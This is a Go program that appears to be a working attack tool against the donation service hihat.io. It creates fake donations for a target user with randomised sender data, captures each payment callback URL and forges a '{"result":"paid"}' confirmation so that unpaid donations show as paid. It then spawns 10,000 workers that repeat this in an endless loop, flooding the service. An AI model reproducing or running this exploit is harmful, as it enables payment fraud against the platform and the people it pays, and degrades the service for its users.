package main

import (
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"strconv"
	"sync"

	"github.com/gookit/color"
	"github.com/valyala/fasthttp"
)

var (
	LaddkoddFails   int
	TeliaFails      int
	ProdMobil2Fails int
	TotalRequests   int
)
var wg sync.WaitGroup
var errorChan chan error // Channel for error messages

// Define the number of worker goroutines in the pool
const numWorkers = 10000

func main() {
	color.Println(`<fg=1d4ed8> 
 /$$                           /$$                   /$$    
| $$                          | $$                  | $$    
| $$$$$$$   /$$$$$$   /$$$$$$ | $$$$$$$   /$$$$$$  /$$$$$$  
| $$__  $$ /$$__  $$ /$$__  $$| $$__  $$ |____  $$|_  $$_/  
| $$  \ $$| $$  \ $$| $$$$$$$$| $$  \ $$  /$$$$$$$  | $$    
| $$  | $$| $$  | $$| $$_____/| $$  | $$ /$$__  $$  | $$ /$$
| $$  | $$|  $$$$$$/|  $$$$$$$| $$  | $$|  $$$$$$$  |  $$$$/
|__/  |__/ \______/  \_______/|__/  |__/ \_______/   \___/  
</>v1.5.1 (<fg=gray>2023-11-08 - 22:14</>)`)

	errorChan = make(chan error, numWorkers)
	fmt.Println()
	fmt.Print("Enter the target (e.g., hihatnick): ")
	var target string
	fmt.Scanln(&target)

	go errorLogger() // Start the error logging goroutine

	getNick(createPayment(target))
	// Create a job channel to send tasks to workers
	jobChannel := make(chan string, numWorkers)

	// Start worker goroutines
	for i := 0; i < numWorkers; i++ {
		go worker(jobChannel)
	}

	// Start the job scheduler in a separate goroutine
	jobScheduler(jobChannel)

	// Wait for all worker goroutines to finish
	wg.Wait()
	close(jobChannel)
	close(errorChan)
}

func worker(jobChannel <-chan string) {
	for payID := range jobChannel {
		err := getNick(payID)
		if err != nil {
			errorChan <- err
		}
	}
}

func jobScheduler(jobChannel chan<- string) {
	for {
		payID := createPayment("conja")
		jobChannel <- payID
	}
}

// second
func getNick(id string) error {
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)
	req.Header.SetMethod("GET")
	req.SetRequestURI("https://hihat.io/api/" + id)
	if err := fasthttp.Do(req, resp); err != nil {
		return err
	}

	// Check if the response status code is a redirect (e.g., 301 or 302)
	if resp.StatusCode() == fasthttp.StatusMovedPermanently || resp.StatusCode() == fasthttp.StatusFound {
		locationHeader := string(resp.Header.Peek("Location"))

		parsedURL, _ := url.Parse(locationHeader)

		callbackURL := parsedURL.Query().Get("callbackurl")
		go sendExploit(callbackURL)
		color.Println("<fg=blue>[INFO]</>", "User is vulnerable: <fg=gray>", callbackURL)
	} else {
		color.Println("<fg=red>[ERRO]</>", "Callback might have been missed, it might take some attempts.")
	}
	return nil
}

// first
func createPayment(target string) string {
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)
	req.Header.SetMethod("POST")
	req.SetRequestURI("https://hihat.io/api/purchase_donation?")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.SetBodyString(string("PATH=" + target + "&senderName=PayT4ke&amount=" + strconv.Itoa(rand.Intn(22200)) + "&message=&number=070" + strconv.Itoa(rand.Intn(9999999)) + "&type=message"))
	fasthttp.Do(req, resp)
	var userMap map[string]interface{}

	json.Unmarshal([]byte(resp.Body()), &userMap)

	id, _ := userMap["nickname"].(string)
	return id
}

// final
func sendExploit(payid string) {
	client := &http.Client{}
	req, err := http.NewRequest("GET", payid+"&resp="+`{"result":"paid"}`, nil)
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36")
	req.Header.Set("sec-ch-ua", `"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"`)
	req.Header.Set("sec-ch-ua-mobile", "?1")
	req.Header.Set("sec-ch-ua-platform", `"Android"`)
	client.Do(req)

	fmt.Println(payid)
}

func errorLogger() {
	// Print error messages only once
	seenErrors := make(map[string]bool)
	for err := range errorChan {
		errStr := err.Error()
		if !seenErrors[errStr] {
			color.Println("<fg=red>[ERRO]</>", err)
			seenErrors[errStr] = true
		}
	}
}
